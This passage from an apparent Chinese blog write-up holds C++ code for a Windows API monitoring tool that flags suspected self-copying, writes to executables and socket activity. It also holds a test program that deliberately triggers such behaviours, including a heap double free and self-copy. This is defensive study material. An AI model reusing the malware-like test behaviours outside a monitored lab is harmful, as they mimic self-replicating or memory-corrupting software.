class="comment">//&#123;</span></span><br><span class="line">		<span class="comment">//	filenameset.insert(filename);//没有找到就加入该文件名称</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">		<span class="comment">//else &#123;</span></span><br><span class="line">		<span class="comment">//	//找到该文件后添加提示信息</span></span><br><span class="line">		<span class="comment">//	strcat(str, &quot;该操作存在文件的重复操作，可能是自我复制！\n&quot;);</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">		<span class="keyword">if</span> (dwDesiredAccess &amp; GENERIC_READ) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(fileName, filename) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="built_in">strcat</span>(str, <span class="string">&quot;该操作可能进行文件自我复制！\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwDesiredAccess &amp; GENERIC_WRITE) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strstr</span>(filename, <span class="string">&quot;.exe&quot;</span>) || <span class="built_in">strstr</span>(filename, <span class="string">&quot;.dll&quot;</span>) || <span class="built_in">strstr</span>(filename, <span class="string">&quot;.ocx&quot;</span>)) &#123;</span><br><span class="line">				<span class="built_in">strcat</span>(str, <span class="string">&quot;该操作创建了可执行文件！\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (folderset.<span class="built_in">size</span>() &gt;= <span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//temp+=&quot;当前操作范围有多个文件夹！&quot;;</span></span><br><span class="line">			<span class="built_in">strcat</span>(str, <span class="string">&quot;当前操作范围有多个文件夹！&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//strcpy(str, temp.c_str());</span></span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newFileInfo</span><span class="params">(handle, QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> COPYFILEA:</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="built_in">strcpy</span>(str, tempInfo.Value[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strstr</span>(str, fileName))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">			<span class="built_in">sprintf</span>(str, <span class="string">&quot;该操作(CopyFileA)表明文件自我复制！\n&quot;</span>);</span><br><span class="line">			<span class="function">emit <span class="title">newFileInfo</span><span class="params">(<span class="number">0</span>,QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WRITEFILE:</span><br><span class="line">		handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">16</span>);<span class="comment">//写的文件句柄</span></span><br><span class="line">		<span class="comment">/*f = fopen(&quot;test.txt&quot;, &quot;a+&quot;);</span></span><br><span class="line"><span class="comment">		fprintf(f, &quot;%d&quot;, handle);</span></span><br><span class="line"><span class="comment">		fclose(f);*/</span></span><br><span class="line">		<span class="comment">/*emit newInfo(tempInfo);*/</span></span><br><span class="line">		s1=tempInfo.Value[<span class="number">0</span>];<span class="comment">//文件句柄转string</span></span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="keyword">if</span> (filemap.<span class="built_in">find</span>(s1) == filemap.<span class="built_in">end</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//未曾创建过该文件，则不将修改信息打印出来</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			string s = (*filemap.<span class="built_in">find</span>(s1)).second;<span class="comment">//文件名称</span></span><br><span class="line">			<span class="comment">//memcpy(str, s.data(), sizeof(s));</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strstr</span>(s.<span class="built_in">data</span>(), <span class="string">&quot;.exe&quot;</span>) || <span class="built_in">strstr</span>(s.<span class="built_in">data</span>(), <span class="string">&quot;.dll&quot;</span>) || <span class="built_in">strstr</span>(s.<span class="built_in">data</span>(), <span class="string">&quot;.ocx&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">				<span class="built_in">strcat</span>(str, <span class="string">&quot;该函数修改了可执行程序文件(exe,dll或cox)!\n&quot;</span>);</span><br><span class="line">				<span class="function">emit <span class="title">newFileInfo</span><span class="params">(handle, QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//莫名其妙总是提示会自我复制，filesize没有正确拿到值？确实啊，难顶</span></span><br><span class="line">			<span class="comment">//判断文件是否会进行自我复制</span></span><br><span class="line">			<span class="comment">//通过要写的字节数和文件自身大小进行比较？设定一个范围？假设范围为+-100字节</span></span><br><span class="line">			<span class="keyword">int</span> bytes = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">			<span class="comment">//int filesize = GetFileSize(fileName,NULL);</span></span><br><span class="line">			<span class="keyword">if</span> ((bytes &lt;= fileSize + <span class="number">100</span>) &amp;&amp; (bytes &gt;= fileSize - <span class="number">100</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">strcat</span>(str, <span class="string">&quot;通过大小表明该程序可能进行自我复制！\n&quot;</span>);</span><br><span class="line">				<span class="function">emit <span class="title">newFileInfo</span><span class="params">(handle, QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> READFILE:</span><br><span class="line">		handle = <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">0</span>], <span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">		s1 = tempInfo.Value[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">if</span> (filemap.<span class="built_in">find</span>(s1) == filemap.<span class="built_in">end</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			string s = (*filemap.<span class="built_in">find</span>(s1)).second;</span><br><span class="line">			<span class="comment">//memcpy(str, s.data(), sizeof(s));</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strstr</span>(s.<span class="built_in">data</span>(), <span class="string">&quot;.exe&quot;</span>) || <span class="built_in">strstr</span>(s.<span class="built_in">data</span>(), <span class="string">&quot;.dll&quot;</span>) || <span class="built_in">strstr</span>(s.<span class="built_in">data</span>(), <span class="string">&quot;.ocx&quot;</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">				<span class="built_in">strcat</span>(str, <span class="string">&quot;该函数读取了可执行程序文件(exe,dll或cox)!&quot;</span>);</span><br><span class="line">				<span class="function">emit <span class="title">newFileInfo</span><span class="params">(handle, QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CLOSEHANDLE:</span><br><span class="line">		<span class="comment">//由于创建文件获得的句柄都以string存储在filemap中，而这里的closehandle只针对文件类</span></span><br><span class="line">		s1 = tempInfo.Value[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">if</span> (filemap.<span class="built_in">find</span>(s1) == filemap.<span class="built_in">end</span>())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			emit <span class="built_in">newInfo</span>(tempInfo);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> THESOCKET:</span><br><span class="line">		heapHandle= <span class="built_in">strtoul</span>(tempInfo.Value[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">10</span>);</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="keyword">if</span> (heapHandle == IPPROTO_IP) &#123; <span class="built_in">strcat</span>(str, <span class="string">&quot;使用IP协议传输！\n&quot;</span>); &#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (heapHandle == IPPROTO_TCP) &#123; <span class="built_in">strcat</span>(str, <span class="string">&quot;使用TCP协议传输！\n&quot;</span>); &#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (heapHandle == IPPROTO_UDP) &#123; <span class="built_in">strcat</span>(str, <span class="string">&quot;使用UDP协议传输！\n&quot;</span>); &#125;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newSocketInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BIND:</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="built_in">strcat</span>(str, <span class="string">&quot;绑定IP地址为： &quot;</span>);</span><br><span class="line">		<span class="built_in">strcat</span>(str, tempInfo.Value[<span class="number">3</span>]);</span><br><span class="line">		<span class="built_in">strcat</span>(str, <span class="string">&quot;      端口号为：   &quot;</span>);</span><br><span class="line">		<span class="built_in">strcat</span>(str, tempInfo.Value[<span class="number">4</span>]);</span><br><span class="line">		<span class="function">emit <span class="title">newSocketInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SEND:</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="built_in">strcat</span>(str, <span class="string">&quot;发送数据为：  &quot;</span>);</span><br><span class="line">		<span class="built_in">strcat</span>(str, tempInfo.Value[<span class="number">4</span>]);</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newSocketInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> CONNECT:</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="built_in">strcat</span>(str, <span class="string">&quot;连接IP地址为:   &quot;</span>);</span><br><span class="line">		<span class="built_in">strcat</span>(str, tempInfo.Value[<span class="number">3</span>]);</span><br><span class="line">		<span class="built_in">strcat</span>(str, <span class="string">&quot;      端口号为：   &quot;</span>);</span><br><span class="line">		<span class="built_in">strcat</span>(str, tempInfo.Value[<span class="number">4</span>]);</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newSocketInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> RECV:</span><br><span class="line">		<span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(str));</span><br><span class="line">		<span class="built_in">strcat</span>(str, <span class="string">&quot;接收数据为：   &quot;</span>);</span><br><span class="line">		<span class="built_in">strcat</span>(str, tempInfo.Value[<span class="number">4</span>]);</span><br><span class="line">		<span class="function">emit <span class="title">newInfo</span><span class="params">(tempInfo)</span></span>;</span><br><span class="line">		<span class="function">emit <span class="title">newSocketInfo</span><span class="params">(QString::fromLocal8Bit(str))</span></span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyThread::GetLastFolder</span><span class="params">(<span class="keyword">char</span>* filePath, string&amp; folder)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> index = <span class="built_in">strlen</span>(filePath);</span><br><span class="line">	<span class="comment">// 去除文件名</span></span><br><span class="line">	<span class="keyword">while</span> (filePath[index - <span class="number">1</span>] != <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">		index--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 去除斜杠</span></span><br><span class="line">	<span class="keyword">while</span> (filePath[index - <span class="number">1</span>] == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">		index--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 得到文件夹</span></span><br><span class="line">	<span class="keyword">while</span> (filePath[index - <span class="number">1</span>] != <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">		index--;</span><br><span class="line">	&#125;</span><br><span class="line">	index++;</span><br><span class="line">	<span class="keyword">while</span> (filePath[index - <span class="number">1</span>] != <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">		folder.<span class="built_in">push_back</span>(filePath[index - <span class="number">1</span>]);</span><br><span class="line">		index++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyThread::GetFileSize</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	fileSize = size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="测试程序testcode"><a class="markdownIt-Anchor" href="#测试程序testcode"></a> 测试程序TestCode</h3>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>S</mi><mi>o</mi><mi>u</mi><mi>r</mi><mi>c</mi><mi>e</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>p</mi><mi>p</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Source.cpp\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord">.</span><span class="mord mathdefault">c</span><span class="mord mathdefault">p</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;exception&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;WinSock2.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)  <span class="comment">//加载 ws2_32.dll</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="comment">//#include &lt;wchar.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE	4096</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//全局变量</span></span><br><span class="line">HANDLE filehandle,filehandle2,filehandle3;</span><br><span class="line"><span class="comment">//自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showMenu</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createfile</span><span class="params">(<span class="keyword">int</span> i)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writefile</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readfile</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HeapCreateAndFree</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HeapRepeadFree</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegCreateAndSet</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SendSocket</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RecvSocket</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SelfCopy</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> op = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">showMenu</span>();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;op);</span><br><span class="line">		<span class="built_in"><span class="keyword">switch</span></span> (op)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// exit</span></span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;See You !\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">			<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;不像我只会心疼哥哥(OvO)&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>, MB_OK);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">			<span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;以手册之力击碎黑暗！&quot;</span>, <span class="string">L&quot;MessageBoxW&quot;</span>, MB_OK);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请选择创建类型：1、创建普通文件  2、创建可执行文件   3、涉及操作多个文件夹\n&quot;</span>);</span><br><span class="line">			<span class="keyword">int</span> i;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">			<span class="built_in">createfile</span>(i);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="built_in">writefile</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="built_in">readfile</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="built_in">HeapCreateAndFree</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="built_in">HeapRepeadFree</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">			<span class="built_in">RegCreateAndSet</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">			<span class="built_in">SendSocket</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">			<span class="built_in">RecvSocket</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">			<span class="built_in">SelfCopy</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// exit</span></span><br><span class="line">		<span class="keyword">if</span> (op == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showMenu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n*************************************************************************************\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------------------------选择操作--------------------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1.弹窗MessageBoxA      2.弹窗MessageBoxW      3.创建文件CreateFile\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;4.写文件WriteFile      5.读文件ReadFile       6.创建堆、释放堆、销毁堆\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;7.堆重复释放           8.注册键操作           9.网络通信之发消息\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;10.网络通信之收消息    11.文件自我复制\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n*************************************************************************************\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createfile</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (i)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		filehandle = <span class="built_in">CreateFile</span>(<span class="string">L&quot;.\\TempFile\\001.txt&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (filehandle == INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;文件创建失败！&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;文件创建成功！&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//创建可执行文件</span></span><br><span class="line">		filehandle = <span class="built_in">CreateFile</span>(<span class="string">L&quot;.\\TempFile\\002.exe&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (filehandle == INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;文件创建失败！&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;文件创建成功！&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		filehandle= <span class="built_in">CreateFile</span>(<span class="string">L&quot;.\\TempFile\\003.exe&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		filehandle2 = <span class="built_in">CreateFile</span>(<span class="string">L&quot;.\\TempFile\\004.dll&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		filehandle3 = <span class="built_in">CreateFile</span>(<span class="string">L&quot;.\\TempFile2\\005.ocx&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> ((filehandle == INVALID_HANDLE_VALUE) || (filehandle2 == INVALID_HANDLE_VALUE) || (filehandle3 == INVALID_HANDLE_VALUE))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;创建多个文件夹中的文件失败！&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;创建成功！&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(filehandle);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(filehandle2);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(filehandle3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writefile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	filehandle = <span class="built_in">CreateFile</span>(<span class="string">L&quot;.\\TempFile\\007.txt&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CHAR* pBuffer;</span><br><span class="line">	<span class="keyword">int</span> fileSize = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> writeString[<span class="number">100</span>] = <span class="string">&quot;总有人间一两风，填我十万八千梦！&quot;</span>;</span><br><span class="line">	<span class="keyword">bool</span> flag;</span><br><span class="line">	<span class="keyword">if</span> (filehandle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		filehandle = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开文件失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;成功打开文件\n&quot;</span>);</span><br><span class="line">	flag = <span class="built_in">WriteFile</span>(filehandle, writeString, <span class="built_in">strlen</span>(writeString), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (flag) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功写入文件\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">FlushFileBuffers</span>(filehandle);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(filehandle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readfile</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 